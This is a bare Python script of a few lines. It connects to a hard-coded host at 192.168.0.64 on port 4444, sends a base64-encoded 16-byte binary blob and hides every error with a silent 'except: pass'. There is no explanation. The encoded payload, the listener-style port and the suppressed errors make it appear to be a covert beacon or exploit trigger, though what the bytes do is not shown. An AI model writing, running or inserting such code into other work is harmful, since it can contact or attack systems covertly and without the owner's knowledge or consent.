import binascii as b
import socket as s
o=s.socket(s.AF_INET,s.SOCK_STREAM)
try:
 o.connect(('192.168.0.64',4444))
 o.send(b.a2b_base64('u3dUrQawTLuB1EpRBQSaIQ=='))
 o.close()
except:
 pass
